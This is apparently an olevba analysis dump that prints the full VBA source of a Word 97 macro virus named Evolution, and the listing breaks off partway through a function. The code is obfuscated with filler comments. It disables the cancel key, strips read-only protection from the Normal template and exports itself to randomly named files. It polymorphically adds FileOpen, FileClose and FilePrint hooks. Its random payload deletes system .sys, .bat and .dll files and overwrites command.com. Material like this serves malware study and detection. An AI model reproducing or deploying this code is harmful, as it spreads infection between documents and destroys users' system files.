olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Evolution.c-e60bf96e4a11a6b985a2cdd72c729f19528df2c4af533968abb2c27528184eee
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Evolution.c-e60bf96e4a11a6b985a2cdd72c729f19528df2c4af533968abb2c27528184eee - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO KTJ.bas 
in file: Virus.MSWord.Evolution.c-e60bf96e4a11a6b985a2cdd72c729f19528df2c4af533968abb2c27528184eee - OLE stream: 'Macros/VBA/KTJ'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 '5184336
 'Kaspersky Labs.
 'T
 'JonMMx 2000
 'T
 '830853
 '6089652
Public Source As String
 '
 '3362602
 'Tester
 'MeMeX
 'Kaspersky Labs.
 '1284233
Public ByeMacro As String
 'Mike Pavluschick
 '6329439
 'T
Public Hostinf As Boolean
 '8494405
 '8557181
 'JonMMx2000@yahoo.com
Public FileInf As Boolean
 'Tester
 'JonMMx2000@yahoo.com
 'Tester
 'MP
 '
Public FExport As String
 '5767354
 'JonMMx2000@yahoo.com
 'Tester
 'MP
 'T
Public PMExport As String
 'Tester
 'MP
 '1616523
 '6608946
 'T
 'Kaspersky Labs.
 '4279354
Public PMFile_Yes As Boolean
 'Tester
 'Kaspersky Labs.
 'JonMMx 2000
 '
Public Ex_Yes As Boolean
 '
 'MP
 '
 'JonMMx2000@yahoo.com
 '
 'MP
 '4406350
Public Filename As String
 'T
 'Kaspersky Labs.
 'JonMMx2000@yahoo.com
 '
 '8426099
 '8982293
Public FileID As String
 'Tester
 'Mike Pavluschick
 'Tester
 '406570
 'Tester
 'Kaspersky Labs.
 'Tester
Public FileID2 As String
 '
 '1287370
 '5184669
 'MP
 'T
Public Virname As String
 'Kaspersky Labs.
 'Tester
 '5470067
 '
 'Kaspersky Labs.
Public FC_There As Boolean
 'Tester
 'MP
 'T
 'MeMeX
 '
Public FO_There As Boolean
 'Mike Pavluschick
 'Tester
 '1545448
 'Mike Pavluschick
 '5569743
Public FP_There As Boolean
 '9625445
 'Mike Pavluschick
 'Tester
 'JonMMx2000@yahoo.com
 '637328
 'Mike Pavluschick
Public FN_There As Boolean
 'JonMMx 2000
 '
 '6152428
Public FS_There As Boolean
 'Tester
 'Kaspersky Labs.
 'Tester
 'MeMeX
 '957849
Public FSA_There As Boolean
 'T
 'MeMeX
 '2935514
 'Mike Pavluschick
 'Tester
Public VrusName As String
 'Mike Pavluschick
 'Tester
 'MeMeX
 '
Public Armor As Boolean
 '1800722
 'Kaspersky Labs.
 'MeMeX
 'Tester
 '7160225
 '5594259
Function Self_Recognition()
 'Tester
 'MP
 'Tester
 'JonMMx 2000
 '403765
On Error Resume Next
 'T
Application.EnableCancelKey = wdCancelDisabled
 'T
 'MP
 'Tester
 'JonMMx 2000
 '4074392
Open "C:\windows\system\vnames.cpl" For Input As #1
 '1541362
 'MP
 'Tester
Do
 '
 'Kaspersky Labs.
 '3320588
Line Input #1, Virname
 'T
 'JonMMx 2000
 '
 'Mike Pavluschick
 '
For Z = 1 To ActiveDocument.VBProject.VBComponents.Count
 'MeMeX
 '7545299
 'Tester
               If ActiveDocument.VBProject.VBComponents(Z).Name <> "ThisDocument" Then
 'Kaspersky Labs.
 'MeMeX
 'Tester
 'Kaspersky Labs.
 'Tester
    If Virname = ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo lost
 '5622860
 'JonMMx 2000
 '
 'Kaspersky Labs.
 '3222193
    If Virname <> ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo newname
 '
 '314697
 '4615064
 'JonMMx2000@yahoo.com
 'T
 'Kaspersky Labs.
 '
newname:
 'Tester
 'Mike Pavluschick
 'Tester
Close #1
 '
 'Kaspersky Labs.
 '2833033
 '5084993
 '
Open "C:\windows\system\vnames.cpl" For Append As #1
 '9433896
 '
 'JonMMx 2000
    Print #1, ActiveDocument.VBProject.VBComponents(Z).Name
 'T
 'Kaspersky Labs.
 'JonMMx 2000
 'T
      Close #1
 '
 'MP
 '
 'JonMMx2000@yahoo.com
 '7019816
 'Mike Pavluschick
        End If
 '
 'Mike Pavluschick
 '9035409
 'JonMMx 2000
 'MP
 'Tester
    If ActiveDocument.VBProject.VBComponents(Z).Name = "ThisDocument" Then GoTo lost
 'T
 '6771065
 '944437
 'JonMMx 2000
 'MP
 'Tester
lost:
 'Tester
 'Mike Pavluschick
 'Tester
 'JonMMx2000@yahoo.com
 '3967826
 'MP
 'T
Next Z
 '
 '5378194
 '6735942
 'MP
 '1309081
Loop Until EOF(1)
 'T
 'MP
 'T
 'MeMeX
 'T
Close #1
 'T
 'MP
 'Tester
 'JonMMx 2000
 'Tester
 'MP
 'T
Dim Lib
 '7249293
 'Kaspersky Labs.
 'Tester
 '21496
 '
 'MP
 'T
Open "C:\windows\system\vnames.cpl" For Input As #1
 'T
 '4077197
 'Tester
 'Mike Pavluschick
 '8515167
Do
 '792925
 'Mike Pavluschick
 '
 'MeMeX
 'Tester
 'Mike Pavluschick
 '
Line Input #1, Virname
 'T
 'Mike Pavluschick
For Lib = 1 To NormalTemplate.VBProject.VBComponents.Count
 'T
 '1576485
 '
 'MeMeX
 'Tester
    If NormalTemplate.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo skip
 'Tester
 'Kaspersky Labs.
    If NormalTemplate.VBProject.VBComponents(Lib).Name = Virname Then Hostinf = True: GoTo doccheck
 '7909943
 '
 'JonMMx 2000
 '
 'Mike Pavluschick
skip:
 'T
 'Mike Pavluschick
 '3946730
 'JonMMx2000@yahoo.com
 '6351483
 'Mike Pavluschick
 'T
Next Lib
 'Tester
 'JonMMx 2000
 'Tester
 'Kaspersky Labs.
Loop Until EOF(1)
 'T
 '4112320
 'T
 'MeMeX
 '6478479
 'MP
 '9137224
doccheck:
 '3065930
 'JonMMx 2000
 'Tester
 'Mike Pavluschick
 'T
Close #1
 '6605475
 'MP
 'JonMMx2000@yahoo.com
 'T
Open "C:\windows\system\vnames.cpl" For Input As #1
 'Mike Pavluschick
 '
 'JonMMx2000@yahoo.com
 '5343686
 'MP
 '
Do
 'MP
 '
Line Input #1, Virname
 'T
 'MeMeX
 'Tester
 'Mike Pavluschick
For Lib = 1 To ActiveDocument.VBProject.VBComponents.Count
 '7778861
 '279574
 'Mike Pavluschick
 '9165825
    If ActiveDocument.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo nope
 '173622
 'MP
 '5499284
 'JonMMx2000@yahoo.com
 'Kaspersky Labs.
    If ActiveDocument.VBProject.VBComponents(Lib).Name = Virname Then FileInf = True: GoTo leave
 'Mike Pavluschick
 '7772954
 '3561041
 'Kaspersky Labs.
 '
    If ActiveDocument.VBProject.VBComponents(Lib).Name <> Virname Then FileInf = False:
 'Tester
 'Mike Pavluschick
 'Tester
 'MeMeX
 'Kaspersky Labs.
 'T
nope:
 'Tester
 '7747824
 'Kaspersky Labs.
 'Tester
Next Lib
 'T
 '7358664
 'Mike Pavluschick
Loop Until EOF(1)
 '5368202
 'Mike Pavluschick
 'JonMMx 2000
 '
 'MP
 'Tester
FileInf = False
 '
 'Mike Pavluschick
 'Tester
 '5211989
 '
 'Kaspersky Labs.
 'Tester
leave:
 'T
 'Mike Pavluschick
 '5265721
 'MeMeX
 '
 'MP
 'T
Close #1
 '329220
 'Kaspersky Labs.
 'Tester
 '7874820
 '
 'Kaspersky Labs.
 '8600305
End Function
 '8036939
 'Tester
Function Armor_Status()
 'Tester
 'MP
 'T
 '2553244
 '6068556
 'MP
 'Tester
Application.EnableCancelKey = wdCancelDisabled
 'Tester
 'Kaspersky Labs.
 'Tester
 'JonMMx2000@yahoo.com
 '3532722
 '1834563
 'T
If GetAttr(NormalTemplate.FullName) = vbReadOnly Then Armor = True
 '6195552
 'JonMMx2000@yahoo.com
 'Kaspersky Labs.
 '873977
Offense:
 '
 'Kaspersky Labs.
 'JonMMx2000@yahoo.com
 'Mike Pavluschick
If Armor = True Then SetAttr (NormalTemplate.FullName), vbNormal
 '3606934
 'MP
 '4614731
 '8001816
 '
 '2973442
 '
Armor = False
 '9424236
 '7029143
 'MeMeX
 '2214064
 'Mike Pavluschick
 '
End Function
 'T
 'Mike Pavluschick
 'Tester
 'MeMeX
 '8027280
 'Mike Pavluschick
 'Tester
Function Export_Code()
 '9293154
 'MP
 'Tester
On Error Resume Next
 'T
 'JonMMx 2000
 '4356653
 'Mike Pavluschick
 '9809310
Application.EnableCancelKey = wdCancelDisabled
 'MP
 'T
 'JonMMx 2000
 'T
 'Kaspersky Labs.
FExport = Dir("C:\windows\system\export.sys")
 'Tester
 'Mike Pavluschick
 'T
 'JonMMx2000@yahoo.com
 '6191800
 'Mike Pavluschick
 'T
If FExport = "Export.sys" Then Ex_Yes = True
 '9346271
 'MP
 'JonMMx2000@yahoo.com
 'Tester
 'Mike Pavluschick
 'Tester
If Ex_Yes = False Then GoTo Morph Else GoTo Recognize
 '
 'Mike Pavluschick
 'JonMMx2000@yahoo.com
 '
 'Mike Pavluschick
 'T
Morph:
 'T
 'Kaspersky Labs.
 '
 'JonMMx2000@yahoo.com
 '2009102
 'Mike Pavluschick
 '
Randomize Timer
 'T
 '6512987
 '
q = Int(Rnd(1) * 5) + 1
 'MP
 '1001306
 'MeMeX
 'T
 'Mike Pavluschick
For vi = 1 To q
 'T
 'Kaspersky Labs.
 '
 'JonMMx 2000
 '7199596
 'MP
 'Tester
x = Int(Rnd(1) * 26)
 'T
 'Mike Pavluschick
 'T
 '3819119
 'Tester
 'MP
 'T
If x = 1 Then a$ = "A"
 '6814522
 'Kaspersky Labs.
 '7822318
 'JonMMx2000@yahoo.com
 '
 'MP
 '
If x = 2 Then a$ = "B"
 'MP
If x = 3 Then a$ = "C"
 'MeMeX
If x = 4 Then a$ = "D"
 'T
 'Kaspersky Labs.
 '5286484
 'JonMMx2000@yahoo.com
 'Tester
 '5505190
If x = 5 Then a$ = "E"
 'Kaspersky Labs.
 'T
 '2811322
 '2500743
If x = 6 Then a$ = "F"
 'Tester
 'Kaspersky Labs.
 'Tester
 'MeMeX
 '7564240
If x = 7 Then a$ = "G"
 '
 'MP
 '
 '9267690
 'Tester
 'Kaspersky Labs.
 'Tester
If x = 8 Then a$ = "H"
 '
 'MP
 '
 'JonMMx 2000
 'Mike Pavluschick
 '
If x = 9 Then a$ = "I"
 'Mike Pavluschick
 'T
 '9009612
 '2914418
 'Kaspersky Labs.
 '
If x = 10 Then a$ = "J"
 'T
 'MP
 '7977916
 'JonMMx 2000
 '9048822
 '
If x = 11 Then a$ = "K"
 '9993509
 '1707567
 '3922215
 'JonMMx2000@yahoo.com
 'T
 '5636272
 '1902536
If x = 12 Then a$ = "L"
 'MP
If x = 13 Then a$ = "M"
 '
 'MP
 'T
 'JonMMx2000@yahoo.com
 '9175818
If x = 14 Then a$ = "N"
 '
 'JonMMx 2000
 '7588756
 'MP
 'T
If x = 15 Then a$ = "O"
 'Tester
 'Mike Pavluschick
 '4176207
 'MeMeX
 '
 'Kaspersky Labs.
 '
If x = 16 Then a$ = "P"
 '7715752
If x = 17 Then a$ = "Q"
 '
 'Kaspersky Labs.
 '
 'MeMeX
 '9302814
 '
If x = 18 Then a$ = "R"
 '
 'Mike Pavluschick
 '1775540
 'JonMMx2000@yahoo.com
 'T
If x = 19 Then a$ = "S"
 'Tester
 'Kaspersky Labs.
 '6598969
 'JonMMx2000@yahoo.com
 'Kaspersky Labs.
 '658757
If x = 20 Then a$ = "T"
 'T
 'Kaspersky Labs.
 '4194216
If x = 21 Then a$ = "U"
 'T
 'Kaspersky Labs.
 '
 'JonMMx2000@yahoo.com
 '527675
 'Kaspersky Labs.
 'T
If x = 22 Then a$ = "V"
 'Tester
 'MP
 'Tester
If x = 23 Then a$ = "W"
 'Tester
 'Mike Pavluschick
 'T
 '275488
 '
 'MP
 'Tester
If x = 24 Then a$ = "X"
 '
If x = 25 Then a$ = "Y"
 'Tester
 'MP
 '
If x = 26 Then a$ = "Z"
 'Mike Pavluschick
 'Tester
 'JonMMx 2000
 'MP
Filename = Filename + a$
 '7893445
 'Kaspersky Labs.
 'Tester
 'JonMMx2000@yahoo.com
 '
Next vi
 'Tester
 '9140694
 'Tester
 'MP
 'T
x = Int(Rnd(1) * 999) + 1
 'T
FileID = "C:\windows\system\" & Filename & x & ".cpl"
 '
 'Kaspersky Labs.
 '1486107
 'JonMMx 2000
 'T
 'Mike Pavluschick
 'T
' RAPE v1.2 Export File ID Morph
 '
 'Mike Pavluschick
 'JonMMx2000@yahoo.com
 '
Open "C:\windows\system\Export.sys" For Append As #1
 'Tester
 'MP
 'T
 'JonMMx2000@yahoo.com
 'Mike Pavluschick
 'Tester
Print #1, FileID
 '
Close #1
 '6676601
 'Mike Pavluschick
 'Tester
 'JonMMx 2000
 'MP
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
 'Mike Pavluschick
 'Tester
 '7743738
 '6291527
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
 '7299323
 '1683052
 'JonMMx 2000
 '
 'Mike Pavluschick
 '
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
 '
 'Kaspersky Labs.
 '
 'JonMMx2000@yahoo.com
 'T
 '8270502
rite:
 '
 '9405294
 'Tester
 'MeMeX
 '6057964
 '1810048
 'T
Open "C:\windows\system\vnames.cpl" For Append As #1
 '3657298
 'MP
 '
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
 '5050168
 'Mike Pavluschick
 '
Close #1
 '
nex:
 'T
Next x
 'Tester
 'MP
 '
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
 'T
 'Mike Pavluschick
 '
 '3196396
 '683606
 'Kaspersky Labs.
 '3215354
If CheckMe = "PMF1199.cpl" Then GoTo nextt
 '
 'Mike Pavluschick
 'Tester
Do
 'Kaspersky Labs.
 'MeMeX
 '2334554
 'Kaspersky Labs.
On Error Resume Next
 '
 'Kaspersky Labs.
 '9529854
 'T
 '1941130
 '
Open "C:\windows\system\vnames.cpl" For Input As #1
 'T
 'Mike Pavluschick
 '
 'JonMMx 2000
 '9671722
 'Kaspersky Labs.
 'T
Line Input #1, Virname
 'T
 'Kaspersky Labs.
 '
NormalTemplate.VBProject.VBComponents(Virname).export FileID
 '8278852
 '5738753
 'Tester
ActiveDocument.VBProject.VBComponents(Virname).export FileID
 '
 '6619553
 '1803526
 'T
 '802252
 '8922004
Loop Until EOF(1)
 'T
 'Kaspersky Labs.
 '5732231
 'Tester
 '6877631
 'Tester
nextt:
 'Tester
 'Kaspersky Labs.
 '2490151
 'MeMeX
 'T
 'Mike Pavluschick
 '
Exit Function
 'MP
 'T
Recognize:
 'T
 'MP
 '
 '9271776
 '2617147
 'MP
 '
Open "C:\windows\system\Export.sys" For Input As #1
 'MP
 'T
Line Input #1, FileID
 'Tester
 'Mike Pavluschick
Close #1
 '
 'JonMMx 2000
 '
 'Mike Pavluschick
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
 '
 '6873545
 '
 'MeMeX
If CheckMe = "PMF1199.cpl" Then GoTo tryharder
 'Tester
 'Mike Pavluschick
 '
Do
 '3756026
 'MP
 'Tester
On Error Resume Next
 '
 'MP
 '9398772
 'Mike Pavluschick
 'T
Open "C:\windows\system\vnames.cpl" For Input As #1
 'Tester
 '8139420
 'T
 'MeMeX
 'Tester
 '417178
 'Tester
Line Input #1, Virname
 '577039
 'Mike Pavluschick
 'T
 'MeMeX
 'T
 'Mike Pavluschick
 '5640536
NormalTemplate.VBProject.VBComponents(Virname).export FileID
 'Tester
 'Kaspersky Labs.
 '
 '5986223
 'Mike Pavluschick
 '2723714
ActiveDocument.VBProject.VBComponents(Virname).export FileID
 'Mike Pavluschick
 'T
 'JonMMx2000@yahoo.com
 '
 'Kaspersky Labs.
Loop Until EOF(1)
 '318961
 '2068126
 'T
 'JonMMx 2000
 'T
 'MP
 '6652419
tryharder:
 'Mike Pavluschick
 'T
 '9525768
 '
End Function
 '8069805
 'MP
 'Tester
 'JonMMx 2000
 'T
 '9409380
 'T
Function Polymorphic_Check()
 'Tester
 'MP
 'T
On Error Resume Next
 '7684731
Application.EnableCancelKey = wdCancelDisabled
 'MP
 '
 '8005902
Open FileID2 For Input As #1
 'Mike Pavluschick
 'Tester
 'JonMMx 2000
 'Tester
 'Kaspersky Labs.
 'T
Dim FC_Check
 'Tester
 'Mike Pavluschick
 '
 'JonMMx2000@yahoo.com
 'MP
 '5669138
Do
 'Tester
 'Mike Pavluschick
 'Tester
 'MeMeX
 '
 'Kaspersky Labs.
 'Tester
    Line Input #1, FC_Check
 'Tester
 'Kaspersky Labs.
 '
 'JonMMx2000@yahoo.com
 'T
    If FC_Check = "Sub FileClose()" Then FC_There = True: GoTo FO_Look
 'Tester
 'MP
 'T
 'JonMMx2000@yahoo.com
 'T
 '5611757
 'T
Loop Until EOF(1)
 'Kaspersky Labs.
 'JonMMx2000@yahoo.com
 'T
 '8893224
 '3034908
FO_Look:
 '5566657
 'MP
 '
 '9656850
 'Tester
Dim FO_Check
 '
 'Kaspersky Labs.
 '761238
 'JonMMx 2000
 '2690848
 '4169701
Do
 'Mike Pavluschick
 'Tester
 'JonMMx2000@yahoo.com
 'Tester
 '544174
 'Tester
    Line Input #1, FO_Check
 'T
 'MP
 '
 'JonMMx2000@yahoo.com
 '3207004
 'Tester
    If FO_Check = "Sub FileOpen()" Then FO_There = True: GoTo FP_Look
 'Tester
 '3454474
 'T
 '7885428
 '630156
Loop Until EOF(1)
 'Kaspersky Labs.
 '4335275
 '8589380
 'Kaspersky Labs.
 'Tester
FP_Look:
 'T
 'Kaspersky Labs.
 'Tester
 'JonMMx2000@yahoo.com
 '2260008
 '3334000
 '
Dim FP_Check
 '
 'MP
 '5799553
 'MeMeX
 '
 'MP
 '5049835
Do
 '
 'MeMeX
 '
 'Mike Pavluschick
 '9859340
    Line Input #1, FP_Check
 '9597176
 'Mike Pavluschick
 '4593353
 '
 'Kaspersky Labs.
 'Tester
    If FP_Check = "Sub FilePrint()" Then FP_There = True: GoTo FN_Look
 'Tester
 'Kaspersky Labs.
 '8462384
 '8649054
 '7131623
 '9728258
Loop Until EOF(1)
 '609060
 'JonMMx 2000
 '4791757
 'MP
 'T
FN_Look:
 'T
 'Mike Pavluschick
 'JonMMx 2000
 'Tester
 '9151302
 'T
Dim FN_Check
 'Kaspersky Labs.
 'T
 'JonMMx 2000
Do
 'T
 'Kaspersky Labs.
 '2518086
 'MeMeX
 '3525883
 'Kaspersky Labs.
 'T
    Line Input #1, FN_Check
 '5205432
 '8143506
 'Tester
    If FN_Check = "Sub FileNew()" Then FN_There = True: GoTo FS_Look
 '4328718
 'MP
 'Tester
Loop Until EOF(1)
 '4599875
 'Tester
FS_Look:
 '
 'Mike Pavluschick
 '
 'JonMMx2000@yahoo.com
 '4341797
Dim FS_Check
 'Tester
 'Mike Pavluschick
 '
 'JonMMx 2000
 'T
 'Kaspersky Labs.
 '6217314
Do
 '1796969
 '6740027
 'T
 'Kaspersky Labs.
 'T
    Line Input #1, FS_Check
 'Tester
 'Mike Pavluschick
 '5467596
 'JonMMx 2000
 '6602388
 'MP
 '9007141
    If FS_Check = "Sub FileSave()" Then FS_There = True: GoTo FSA_Look
 'T
 'MeMeX
 '
 'MP
 'Tester
Loop Until EOF(1)
 '
 'Kaspersky Labs.
 'T
 'JonMMx 2000
 '
 'Kaspersky Labs.
 '9134137
FSA_Look:
 '
 'JonMMx2000@yahoo.com
 'Tester
 'Kaspersky Labs.
 '
Dim FSA_Check
 'Tester
 'JonMMx 2000
 '
 '5607671
 'T
Do
 'Tester
 '8132898
 '
    Line Input #1, FSA_Check
 'T
 'Mike Pavluschick
 'Tester
 'MeMeX
 '
 'Kaspersky Labs.
 '6884982
    If FSA_Check = "Sub FileSaveAs()" Then FSA_There = True: Exit Function
 'T
 '4472879
 'Tester
 'JonMMx 2000
 '170536
Loop Until EOF(1)
 '4226237
 'Mike Pavluschick
 'T
 '1258769
 'Kaspersky Labs.
 'T
End Function
 'Kaspersky Labs.
 'Tester
 'MeMeX
 '
Function Payload()
 'T
 'Mike Pavluschick
 'T
 'JonMMx2000@yahoo.com
 'Tester
 '3075922
 '
On Error Resume Next
 '
 'Mike Pavluschick
 '7592227
 'T
 'MP
 '428614
'Now we got a nasty little payload....
 'T
 'Mike Pavluschick
 '
 'JonMMx2000@yahoo.com
 '1587922
 '6746549
 'T
Check$ = Dir("C:\error1.sys")
 'T
 '7881342
 '
 'MeMeX
 '195051
 '286096
 'Tester
If Check$ = "error1.sys" Then Exit Function
 '
 'Kaspersky Labs.
Randomize Timer
 'T
 '9536376
 '
 'JonMMx2000@yahoo.com
 '
 'Kaspersky Labs.
 'T
x = Int(Rnd(1) * 100)
 'Kaspersky Labs.
 'Tester
If x = 1 Then
 'Tester
 'JonMMx 2000
 'Tester
 '413092
 'Tester
Open "C:\autoexec.bat" For Append As #1
 'Kaspersky Labs.
 '7921380
 'JonMMx2000@yahoo.com
 '
Print #1, "echo Everything must change"
 '2726800
 'Kaspersky Labs.
 'JonMMx 2000
 'Tester
 'Mike Pavluschick
 'Tester
Close #1
 'Mike Pavluschick
 '
 'MeMeX
 '8929176
 '2948926
 'T
End If
 'Tester
 'JonMMx 2000
 'T
 '4214801
 '2801013
If x = 2 Then
 'T
 'JonMMx 2000
 '
 'Mike Pavluschick
 '9134470
Open "C:\command.com" For Output As #1
 '
 'Mike Pavluschick
 'Tester
 '9992893
 'Mike Pavluschick
 '
Print #1, "W97M/Evolution .b!!"
 'JonMMx2000@yahoo.com
Close #1
 'T
 'Kaspersky Labs.
 'Tester
 'MeMeX
 'T
 'Kaspersky Labs.
 'Tester
End If
 'Tester
 '5056392
 '1535138
 'MP
 'T
If x = 3 Then
 'T
 '261580
 '6598636
 'JonMMx 2000
Kill "C:\*.sys"
 '
 'Mike Pavluschick
 'JonMMx2000@yahoo.com
 '3681813
 'MP
Kill "C:\*.bat"
 'T
 'Mike Pavluschick
 '
End If
 'Mike Pavluschick
 '1277060
 'JonMMx 2000
 'T
 'Mike Pavluschick
 'Tester
If x = 50 Then
 '
 'MP
 '
Kill "C:\windows\system\*.dll"
 'Tester
 'MP
 '
 'JonMMx 2000
 '6832198
 '2793329
 '887900
End If
 'T
 '5452074
 'T
 'MeMeX
 'T
 '9380779
 '
If x = 25 Then
 'MP
 'Tester
 'JonMMx2000@yahoo.com
 'Tester
 'MP
 '891986
Open "C:\windows\Control.ini" For Append As #1
 '2920325
 'T
Seek #1, 0
 'T
Print #1, "[Screen Saver.3DText]"
 '
 'MP
 'T
 'JonMMx 2000
 '2157861
Print #1, "DemoType = 0"
 'Kaspersky Labs.
 '
 'MeMeX
 'T
Print #1, "RotStyle = 3"
 'T
 'Kaspersky Labs.
 '9753107
 'MeMeX
 'T
 'Kaspersky Labs.
 '
Print #1, "Tesselation = 100"
 '
Print #1, "Size = 100"
 'Tester
 'Mike Pavluschick
 '
 'JonMMx 2000
 '
Print #1, "Speed = 100"
 '
 'Kaspersky Labs.
 'JonMMx2000@yahoo.com
 'Tester
 'Kaspersky Labs.
 '
Print #1, "SurfStyle = 0"
 'Kaspersky Labs.
 'T
Print #1, "Font = Comic Sans MS"
 'MP
 'T
 'MeMeX
 '7118878
 'Kaspersky Labs.
 '8126674
Print #1, "FontAttributes = 0"
 'Mike Pavluschick
 'Tester
 'JonMMx 2000
 'Mike Pavluschick
 'T
Print #1, "Charset = 0"
 'Mike Pavluschick
 'Tester
Print #1, "Text = Evolution"
 'T
 '7729830
 'T
 'JonMMx2000@yahoo.com
 '
 'Mike Pavluschick
 '789506
Print #1, "Texture = None"
 'T
 'MP
 'T
 '7719223
 '
 'MP
Print #1, "TextureFileOffset = 3"
 '9781708
 'Kaspersky Labs.
 'T
 '250972
 'Tester
 'MP
 'Tester
Close #1
 '
 '8995705
 '5979999
 'JonMMx2000@yahoo.com
 '
End If
 '
 '8991619
 '
 'MeMeX
 '
 'MP
 '
If x = 75 Then
 'T
 '6590952
 '
 'JonMMx2000@yahoo.com
 '
 'MP
' I love this nice little trick for Dr. Solomon
 'T
 '7983823
 'T
 'JonMMx 2000
 '3603848
 'Kaspersky Labs.
 '
Open "C:\windows\import.exe" For Append As #1
 'T
 'Kaspersky Labs.
 'MeMeX
 '
 'MP
 'Tester
Print #1, "ZQZXJVBVT"
 'MeMeX
 '2206891
 'Kaspersky Labs.
Print #1, "Oops looks like you got a 'virus'"
 '3472766
 '8854015
 '4353566
 'Mike Pavluschick
 '
Close #1
 '
 'Kaspersky Labs.
 'T
 '2655725
 'T
 'Mike Pavluschick
End If
 'Tester
 'Kaspersky Labs.
 'T
 'JonMMx 2000
 '945103
 'Mike Pavluschick
 '3476852
If x = 69 Then
 'Tester
 'MP
 'T
 'MeMeX
 'Tester
 '5325078
 'Tester
Open "C:\windows\Evolution.bmp" For Append As #1
 'Kaspersky Labs.
 'T
 'MeMeX
 'T
 'MP
 '8306787
Print #1, "dedicated to that special little someone.."
 '
 '388576
 '6033116
 'JonMMx 2000
 'Mike Pavluschick
 'Tester
Print #1, "She knows who she is..."
 'Tester
 'Kaspersky Labs.
 '
Close #1
 '3628363
End If
 'T
 'Mike Pavluschick
 'MeMeX
 '
If x = 83 Then
 '7171994
 'MP
 '
Open "C:\windows\system\data101.cpl" For Append As #1
 'MP
 'Tester
Print #1, "Word97 Macro Evolution .b"
 'Kaspersky Labs.
 'T
 'JonMMx 2000
 'Tester
Close #1
 'Tester
 'MeMeX
 'Tester
 'Mike Pavluschick
 'Tester
End If
 'MP
 '
 '7850305
 '9830756
 'MP
 '5156419
End Function
 '3302963
 'Mike Pavluschick
Function Evolve()
 '7430089
 'Kaspersky Labs.
 'JonMMx 2000
 '
On Error Resume Next
 'Tester
 'MP
 'Tester
 'JonMMx2000@yahoo.com
 'Mike Pavluschick
 'T
Application.EnableCancelKey = wdCancelDisabled
 'Tester
 'JonMMx2000@yahoo.com
 'Kaspersky Labs.
 'Tester
'RAPE v1.2 Macro Virus Command/Code Editor - adds 1 to 6 Commands (subs)
 '3051407
 '
Open "C:\windows\system\Export.sys" For Input As #1
 '
 '5583156
 'T
 '1025206
 'Kaspersky Labs.
 '
Line Input #1, FileID2
 'MP
 'Tester
 '3429959
 '
 'Kaspersky Labs.
 'Tester
Close #1
 '
 'Mike Pavluschick
 'Tester
 'MeMeX
 'T
 'MP
 '4922856
PM = Int(Rnd(1) * 150) + 1
 '
 'MP
 'T
 '6584430
 '9986354
 '4186199
 'Tester
If PM = 22 Then
 '
 '7987908
If FC_There = True Then Exit Function
 'Tester
 'Mike Pavluschick
 'Tester
 'MeMeX
 'T
 'MP
 'T
Open FileID2 For Append As #1
 '
 'MP
 'JonMMx 2000
 'Tester
Print #1, "Sub FileClose()"
 'T
 'Kaspersky Labs.
 'T
 '3556955
 'T
 '4444277
Print #1, "On error resume next"
 'Tester
 'Kaspersky Labs.
 'Tester
 'JonMMx2000@yahoo.com
 '
 '646654
Print #1, "Call Evolution"
 '2415623
 'Mike Pavluschick
 'Tester
 'MeMeX
 'T
 'Kaspersky Labs.
 'T
Print #1, "Wordbasic.FileSave"
 'T
 '5456160
 'T
 'MeMeX
 'Tester
 'MP
Print #1, "End Sub"
 'Tester
 '5198082
 '6471324
 'JonMMx2000@yahoo.com
 'MP
 'T
Close #1
 'T
 '1527455
 'T
End If
 'Tester
 '4059203
 '7737198
 'JonMMx 2000
 '14956
 'Kaspersky Labs.
 'Tester
If PM = 73 Then
 'Tester
 'Mike Pavluschick
 '
 'JonMMx2000@yahoo.com
 'Tester
 'Kaspersky Labs.
 'T
If FO_There = True Then Exit Function
 '
 '9253783
 '1665904
 'MeMeX
 'T
Open FileID2 For Append As #1
 'Tester
 'JonMMx2000@yahoo.com
 'Tester
 'MP
 '6029380
Print #1, "Sub FileOpen()"
 'Tester
 '6463956
 '
Print #1, "on error resume next"
 'T
 'Mike Pavluschick
 '
Print #1, "Dialogs(wdDialogFileOpen)"
 'T
 'Mike Pavluschick
 'T
 'MeMeX
 'MP
 'T
Print #1, "Call Evolution"
 '
 'Kaspersky Labs.
 '
 'JonMMx2000@yahoo.com
Print #1, "end sub"
 '7557419
 'MP
 '7295255
 'JonMMx 2000
 'Mike Pavluschick
Close #1
 'Tester
 'MP
 '
 'JonMMx2000@yahoo.com
 '6160462
 '9122701
End If
 'Tester
 'Mike Pavluschick
 '
 'JonMMx2000@yahoo.com
 '
 'Mike Pavluschick
If PM = 69 Then
 'Tester
 '4437755
 '4763506
 'Mike Pavluschick
 'Tester
If FP_There = True Then Exit Function
 'T
 'MP
 'Tester
 'JonMMx 2000
 '8434133
 'Kaspersky Labs.
Open FileID2 For Append As #1
 'MP
 'MeMeX
 '
Print #1, "Sub FilePrint()"
 '
 'Mike Pavluschick
 '
 'MeMeX
 'Mike Pavluschick
 'T
Print #1, "on error resume next"
 'T
 'Mike Pavluschick
 '
 'MeMeX
 '2100675
 'Mike Pavluschick
 '
Print #1, "Dialogs(wdDialogFilePrint)"
 'Kaspersky Labs.
 'T
 'MeMeX
 'Tester
 '6849030
Print #1, "Call Evolution"
 '
 'Kaspersky Labs.
 '
Print #1, "End sub"
 '1654451
 '
Close #1
 '
 'JonMMx 2000
 'Mike Pavluschick
 '7659899
End If
 '3239554
 'Mike Pavluschick
 'Tester
 '8493456
 '2981476
If PM = 122 Then
 'Tester
 'MP
 '9310848
If FN_There = True Then Exit Function
 '1842597
 '7856826
 '
